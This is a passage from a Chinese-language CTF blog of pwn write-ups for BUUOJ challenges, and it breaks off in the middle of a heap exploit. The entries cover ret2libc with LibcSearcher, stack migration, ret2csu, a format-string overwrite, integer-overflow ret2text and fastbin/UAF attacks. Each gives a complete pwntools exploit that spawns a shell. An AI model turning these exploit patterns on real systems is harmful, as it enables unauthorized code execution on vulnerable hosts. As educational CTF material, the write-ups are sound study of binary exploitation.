class="number">4</span>) + p32(leave_ret)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>运行即得flag</p>
<p><img src="https://i.loli.net/2020/12/01/82JX5c3gmUfhuBd.png" alt="image.png"></p>
<h2 id="0x01D-Black-Watch-入群题-PWN-ret2libc-stack-migration"><a href="#0x01D-Black-Watch-入群题-PWN-ret2libc-stack-migration" class="headerlink" title="0x01D.[Black Watch 入群题]PWN - ret2libc + stack migration"></a>0x01D.[Black Watch 入群题]PWN - ret2libc + stack migration</h2><p>惯例的<code>checksec</code>，发现只开了栈不可执行保护</p>
<p><img src="https://i.loli.net/2020/12/01/zX2NEbFpBKWCamq.png" alt="image.png"></p>
<p>拖入IDA进行分析</p>
<p><img src="https://i.loli.net/2020/12/01/9tqkz3s1byJDBId.png" alt="image.png"></p>
<p>第一次往bss段上读入0x200字节，第二次往栈上读入0x20字节，<strong>只能刚好溢出8个字节</strong></p>
<p>故考虑进行栈迁移将栈迁移到bss段上</p>
<p>由于不存在可以直接getshell的gadget，故考虑ret2libc：先泄漏出write函数真实地址后使用LibcSearcher查找libc版本后执行<code>system(&quot;/bin/sh&quot;)</code>即可</p>
<p>故构造exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>, <span class="number">29227</span>) <span class="comment"># process(&quot;./spwn&quot;) #</span></span><br><span class="line">e = ELF(<span class="string">&quot;./spwn&quot;</span>)</span><br><span class="line">bss_addr = <span class="number">0x0804A300</span></span><br><span class="line">leave_ret = <span class="number">0x8048511</span></span><br><span class="line">payload1 = p32(e.plt[<span class="string">&#x27;write&#x27;</span>]) + p32(e.sym[<span class="string">&#x27;main&#x27;</span>]) + p32(<span class="number">1</span>) + p32(e.got[<span class="string">&#x27;write&#x27;</span>]) + p32(<span class="number">4</span>)</span><br><span class="line">payload2 = <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x18</span> + p32(bss_addr - <span class="number">4</span>) + p32(leave_ret)</span><br><span class="line"></span><br><span class="line">p.send(payload1)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;What do you want to say?&#x27;</span>)</span><br><span class="line">p.send(payload2)</span><br><span class="line"></span><br><span class="line">write_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">log.info(<span class="built_in">hex</span>(write_addr))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;write&#x27;</span>, write_addr)</span><br><span class="line">libc_base = write_addr - libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line">sh_addr = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">payload3 = p32(sys_addr) + p32(<span class="number">0xdeadbeef</span>) + p32(sh_addr)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;What is your name?&quot;</span>)</span><br><span class="line">p.send(payload3)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;What do you want to say?&#x27;</span>)</span><br><span class="line">p.send(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>运行即得flag</p>
<p><img src="https://i.loli.net/2020/12/01/BGsMI7SmyxXAbLD.png" alt="image.png"></p>
<h2 id="0x01E-jarvisoj-level3-ret2libc"><a href="#0x01E-jarvisoj-level3-ret2libc" class="headerlink" title="0x01E.jarvisoj_level3 - ret2libc"></a>0x01E.jarvisoj_level3 - ret2libc</h2><p>惯例的<code>checksec</code>，发现只开了栈不可执行保护</p>
<p><img src="https://i.loli.net/2020/12/01/RVDX2UIegLHboN4.png" alt="image.png"></p>
<p>拖入IDA进行分析</p>
<p><img src="https://i.loli.net/2020/12/01/QZ9KJTgDafe3NMh.png" alt="image.png"></p>
<p>存在120字节的溢出</p>
<p>由于不存在可以直接getshell的gadget，故考虑ret2libc：先泄漏出write函数真实地址后使用LibcSearcher查找libc版本后执行<code>system(&quot;/bin/sh&quot;)</code>即可</p>
<p>构造exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./level3&#x27;</span>) <span class="comment"># p = remote(&#x27;node3.buuoj.cn&#x27;,26149)</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./level3&#x27;</span>)</span><br><span class="line">offset = <span class="number">0x88</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&#x27;A&#x27;</span> * offset + p32(<span class="number">0xdeadbeef</span>) + p32(e.plt[<span class="string">&#x27;write&#x27;</span>]) + p32(e.sym[<span class="string">&#x27;main&#x27;</span>]) + p32(<span class="number">1</span>) + p32(e.got[<span class="string">&#x27;write&#x27;</span>]) + p32(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">p.send(payload1)</span><br><span class="line">write_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;write&#x27;</span>,write_addr)</span><br><span class="line">libc_base = write_addr - libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line">sh_addr = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&#x27;A&#x27;</span>*offset + p32(<span class="number">0xdeadbeef</span>) + p32(sys_addr) + p32(<span class="number">0xdeadbeef</span>) + p32(sh_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>运行即得flag</p>
<p><img src="https://i.loli.net/2020/12/01/5lLM1IuKhdqHJwQ.png" alt="image.png"></p>
<blockquote>
<p>感觉ret2libc的题基本都大同小异啊…</p>
</blockquote>
<h2 id="0x01F-jarvisoj-fm-fmtstr"><a href="#0x01F-jarvisoj-fm-fmtstr" class="headerlink" title="0x01F.jarvisoj_fm - fmtstr"></a>0x01F.jarvisoj_fm - fmtstr</h2><p>惯例的<code>checksec</code>，开了NX和canary</p>
<p><img src="https://i.loli.net/2020/12/01/NILo7xYAvaPjm9R.png" alt="image.png"></p>
<p>拖入IDA进行分析，存在格式化字符串漏洞</p>
<p><img src="https://i.loli.net/2020/12/01/lJIRWsXmNeEP67B.png" alt="image.png"></p>
<p>当x为4时直接getshell，x在bss段上</p>
<p><img src="https://i.loli.net/2020/12/01/dzUnkYrhxHR5EiB.png" alt="image.png"></p>
<p>格式化字符串在第13个参数的位置</p>
<p><img src="https://i.loli.net/2020/12/01/hDVSnkOyfovmQdL.png" alt="image.png"></p>
<p>故构造exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">payload = fmtstr_payload(<span class="number">11</span>,&#123;<span class="number">0x804A02C</span>:<span class="number">0x4</span>&#125;)</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">25865</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>运行即得flag</p>
<p><img src="https://i.loli.net/2020/12/01/u3UwrkKvGmgxW59.png" alt="image.png"></p>
<h2 id="0x020-jarvisoj-tell-me-something-ret2csu-ret2libc"><a href="#0x020-jarvisoj-tell-me-something-ret2csu-ret2libc" class="headerlink" title="0x020.jarvisoj_tell_me_something - ret2csu + ret2libc"></a>0x020.jarvisoj_tell_me_something - ret2csu + ret2libc</h2><p>惯例的<code>checksec</code>，发现只开了栈不可执行保护</p>
<p><img src="https://i.loli.net/2020/12/01/EbFBZKn2tPakdlg.png" alt="image.png"></p>
<p>拖入IDA进行分析</p>
<p><img src="https://i.loli.net/2020/12/01/ConYPhEF6378GWA.png" alt="image.png"></p>
<p>直接就有一个很大的溢出</p>
<p>由于不存在可以直接getshell的gadget，故考虑ret2libc：先泄漏出write函数真实地址后使用LibcSearcher查找libc版本后执行<code>system(&quot;/bin/sh&quot;)</code>即可</p>
<p>构造exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;DEBUG&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">26270</span>)<span class="comment">#process(&#x27;./guestbook&#x27;) # </span></span><br><span class="line">e=  ELF(<span class="string">&#x27;./guestbook&#x27;</span>)</span><br><span class="line">offset = <span class="number">0x88</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x4006F3</span></span><br><span class="line">pop_rsi_r15_ret = <span class="number">0x4006f1</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&#x27;A&#x27;</span>* offset + p64(pop_rsi_r15_ret) + p64(e.got[<span class="string">&#x27;write&#x27;</span>]) + p64(<span class="number">0</span>) + p64(pop_rdi_ret) + p64(<span class="number">1</span>) + p64(e.plt[<span class="string">&#x27;write&#x27;</span>]) + p64(e.sym[<span class="string">&#x27;main&#x27;</span>])</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;I have received your message, Thank you!\n&#x27;</span>)</span><br><span class="line">write_addr = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;write&#x27;</span>,write_addr)</span><br><span class="line">libc_base = write_addr - libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line">sh_addr = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&#x27;A&#x27;</span>* offset + p64(pop_rdi_ret) + p64(sh_addr) + p64(sys_addr)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>运行即得flag</p>
<p><img src="https://i.loli.net/2020/12/01/4lBnGzRhCecZ28H.png" alt="image.png"></p>
<h1 id="0x021-0x030"><a href="#0x021-0x030" class="headerlink" title="0x021~0x030"></a>0x021~0x030</h1><h2 id="0x021-jarvisoj-level4-ret2libc"><a href="#0x021-jarvisoj-level4-ret2libc" class="headerlink" title="0x021.jarvisoj_level4 - ret2libc"></a>0x021.jarvisoj_level4 - ret2libc</h2><p>惯例的<code>checksec</code>，发现只开了栈不可执行保护</p>
<p><img src="https://i.loli.net/2020/12/01/tUa3TvpBgSWh4bR.png" alt="I1__E1AGMQCM8C3C__IR4_N.png"></p>
<p>拖入IDA进行分析</p>
<p><img src="https://i.loli.net/2020/12/01/NVODiTzqfhtI1Hy.png" alt="image.png"></p>
<p>直接就有一个很大的溢出</p>
<p>由于不存在可以直接getshell的gadget，故考虑ret2libc：先泄漏出write函数真实地址后使用LibcSearcher查找libc版本后执行<code>system(&quot;/bin/sh&quot;)</code>即可</p>
<p>构造exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./level4&#x27;</span>) <span class="comment"># p = remote(&#x27;node3.buuoj.cn&#x27;,28914)</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./level4&#x27;</span>)</span><br><span class="line">offset = <span class="number">0x88</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&#x27;A&#x27;</span> * offset + p32(<span class="number">0xdeadbeef</span>) + p32(e.plt[<span class="string">&#x27;write&#x27;</span>]) + p32(e.sym[<span class="string">&#x27;main&#x27;</span>]) + p32(<span class="number">1</span>) + p32(e.got[<span class="string">&#x27;write&#x27;</span>]) + p32(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">p.send(payload1)</span><br><span class="line">write_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;write&#x27;</span>,write_addr)</span><br><span class="line">libc_base = write_addr - libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line">sh_addr = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&#x27;A&#x27;</span>*offset + p32(<span class="number">0xdeadbeef</span>) + p32(sys_addr) + p32(<span class="number">0xdeadbeef</span>) + p32(sh_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>运行即得flag</p>
<p><img src="https://i.loli.net/2020/12/01/FxEkX38erav47Ad.png" alt="image.png"></p>
<h2 id="0x022-jarvisoj-level3-x64-ret2csu-ret2libc"><a href="#0x022-jarvisoj-level3-x64-ret2csu-ret2libc" class="headerlink" title="0x022.jarvisoj_level3_x64 - ret2csu + ret2libc"></a>0x022.jarvisoj_level3_x64 - ret2csu + ret2libc</h2><p>惯例的<code>checksec</code>，发现只开了栈不可执行保护</p>
<p><img src="https://i.loli.net/2020/12/01/wKnv9UQdNWiGAgq.png" alt="image.png"></p>
<p>拖入IDA进行分析</p>
<p><img src="https://i.loli.net/2020/12/01/zZDt4oywbmu2Rgp.png" alt="image.png"></p>
<p>直接就有一个很大的溢出</p>
<p>由于不存在可以直接getshell的gadget，故考虑ret2libc：先泄漏出write函数真实地址后使用LibcSearcher查找libc版本后执行<code>system(&quot;/bin/sh&quot;)</code>即可</p>
<p>两个小gadget的地址如下</p>
<p><img src="https://i.loli.net/2020/12/01/Uz1lFs8roh9uSye.png" alt="image.png"></p>
<p>故构造exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./level3_x64&#x27;</span>) <span class="comment"># remote(&#x27;node3.buuoj.cn&#x27;,26836)</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./level3_x64&#x27;</span>)</span><br><span class="line">write_got = e.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_plt = e.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">offset = <span class="number">0x80</span></span><br><span class="line">pop_rsi_r15_ret = <span class="number">0x4006b1</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x4006b3</span></span><br><span class="line">payload1 = <span class="string">b&#x27;A&#x27;</span> * offset + p64(<span class="number">0xdeadbeef</span>) + p64(pop_rsi_r15_ret) + p64(write_got) + p64(<span class="number">0xdeadbeef</span>) + p64(pop_rdi_ret) + p64(<span class="number">1</span>) + p64(write_plt) + p64(e.sym[<span class="string">&#x27;main&#x27;</span>])</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">write_addr = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;write&#x27;</span>,write_addr)</span><br><span class="line">libc_base = write_addr - libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line">sh_addr = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&#x27;A&#x27;</span> * offset + p64(<span class="number">0xdeadbeef</span>) + p64(pop_rdi_ret) + p64(sh_addr) + p64(sys_addr)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>运行即可getshell</p>
<p><img src="https://i.loli.net/2020/12/01/9YlXciZazB3WoQU.png" alt="image.png"></p>
<h2 id="0x023-bjdctf-2020-babystack2-integer-overflow-ret2text"><a href="#0x023-bjdctf-2020-babystack2-integer-overflow-ret2text" class="headerlink" title="0x023.bjdctf_2020_babystack2 - integer overflow + ret2text"></a>0x023.bjdctf_2020_babystack2 - integer overflow + ret2text</h2><p>惯例的<code>checksec</code>，发现只开了栈不可执行保护</p>
<p><img src="https://i.loli.net/2020/12/01/e2jUYcNvISPsZqy.png" alt="image.png"></p>
<p>拖入IDA进行分析</p>
<p><img src="https://i.loli.net/2020/12/01/j2BrJifVY48SbTK.png" alt="image.png"></p>
<p>read读入时会把signed转成unsigned， 输入-1即可绕过检测</p>
<p>同时我们发现存在后门函数，返回至此即可</p>
<p><img src="https://i.loli.net/2020/12/01/MHwmRf2q1tEk9ro.png" alt="image.png"></p>
<p>构造exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./bjdctf_2020_babystack2&#x27;</span>) <span class="comment"># remote(&#x27;node3.buuoj.cn&#x27;, 25058)</span></span><br><span class="line">backdoor = <span class="number">0x400726</span></span><br><span class="line">offset = <span class="number">0x10</span></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * offset + p64(<span class="number">0xdeadbeef</span>) + p64(backdoor)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="built_in">str</span>(-<span class="number">1</span>).encode())</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>运行即可getshell</p>
<p><img src="https://i.loli.net/2020/12/01/xLOq52VBcJ74bUm.png" alt="image.png"></p>
<h2 id="0x024-hitcontraining-uaf-UAF-fastbin-double-free"><a href="#0x024-hitcontraining-uaf-UAF-fastbin-double-free" class="headerlink" title="0x024.hitcontraining_uaf - UAF + fastbin double free"></a>0x024.hitcontraining_uaf - UAF + fastbin double free</h2><p><del>漏洞直接在题目名称里说明了事UAF</del></p>
<p>惯例的<code>checksec</code>，发现只开了栈不可执行保护</p>
<p><img src="https://i.loli.net/2020/12/03/xhMBIPmZ2V8RHyu.png" alt="image.png"></p>
<p>拖入IDA进行分析，我们可以发现这个程序有着<strong>分配、打印、释放堆块的功能</strong></p>
<p>不难看出在添加堆块时首先会分配一个8字节大小的chunk，该chunk前4字节储存一个函数指针，后4字节则储存实际分配的chunk的指针</p>
<p><img src="https://i.loli.net/2020/12/03/6Fg3EXu5rqiH9wQ.png" alt="image.png"></p>
<p>在打印堆块时会调用小chunk中的函数指针来打印堆块内容</p>
<p><img src="https://i.loli.net/2020/12/03/m2nw4WfoP8cGgsS.png" alt="image.png"></p>
<p>同时我们可以发现在释放堆块的过程中并未将堆块指针置0，<strong>存在UAF漏洞</strong></p>
<p><img src="https://i.loli.net/2020/12/03/ZkwVJ34ifBMCytQ.png" alt="image.png"></p>
<p>同时我们可以发现存在后门函数</p>
<p><img src="https://i.loli.net/2021/01/28/5LWOIwy4eD1XgjP.png"></p>
<p>故考虑通过fastbin double free分配到同一个堆块后堆风水改写函数指针为后门函数地址后打印即可getshell</p>
<p>构造exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./hacknote&#x27;</span>) <span class="comment"># remote(&#x27;node3.buuoj.cn&#x27;,28832)</span></span><br><span class="line">backdoor = <span class="number">0x8048945</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">command:<span class="built_in">int</span></span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Your choice :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(command).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new</span>(<span class="params">size:<span class="built_in">int</span>, content</span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Note size :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Content :&quot;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Index :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Index :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    new(<span class="number">8</span>, <span class="string">&quot;arttnba3&quot;</span>) <span class="comment"># idx 0</span></span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    new(<span class="number">0x20</span>, <span class="string">&quot;arttnba3&quot;</span>) <span class="comment"># idx 1</span></span><br><span class="line">    new(<span class="number">8</span>, p32(backdoor)) <span class="comment"># idx 2, overlapping</span></span><br><span class="line">    show(<span class="number">0</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure>

<p>运行即可getshell</p>
<p><img src="https://i.loli.net/2020/12/03/yKXTYzOgBD4HIPW.png" alt="image.png"></p>
<h2 id="0x025-ZJCTF-2019-EasyHeap-fastbin-attack"><a href="#0x025-ZJCTF-2019-EasyHeap-fastbin-attack" class="headerlink" title="0x025.[ZJCTF 2019]EasyHeap - fastbin attack"></a>0x025.[ZJCTF 2019]EasyHeap - fastbin attack</h2><p>惯例的<code>checksec</code>，开了NX和canary</p>
<p><img src="https://i.loli.net/2020/12/03/xyaWKuVEgNkX7rs.png" alt="image.png"></p>
<p>拖入IDA进行分析，可以发现该程序存在分配、编辑、释放堆块的功能</p>
<p>漏洞点在于编辑堆块的地方，可以输入任意长度内容造成堆溢出</p>
<p><img src="https://i.loli.net/2020/12/03/wRoqFJ6Z5VXpLeM.png" alt="image.png"></p>
<p>利用这个漏洞我们可以修改fastbin中的fd分配fake chunk来进行任意地址写</p>
<p>在bss段附近我们可以找到一个size合适的地方</p>
<p><img src="https://i.loli.net/2020/12/03/SjcMlvYBCKwhfp6.png" alt="image.png"></p>
<p>由于plt表中就有system函数，故考虑分配一个bss段上的fake chunk后修改任一堆块指针为<code>free@got</code>后修改<code>free@got</code>为<code>system@plt</code>后free掉一个内容为<code>&quot;/bin/sh\x00&quot;</code>的chunk即可get shell</p>
<p><img src="https://i.loli.net/2020/12/03/w2WaI8uy7Sb1hsz.png" alt="image.png"></p>
<p>构造exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">26930</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./easyheap&#x27;</span>)</span><br><span class="line">backdoor = <span class="number">0x8048945</span></span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">command:<span class="built_in">int</span></span>):</span><br><span class="line">    p.recvuntil(<span 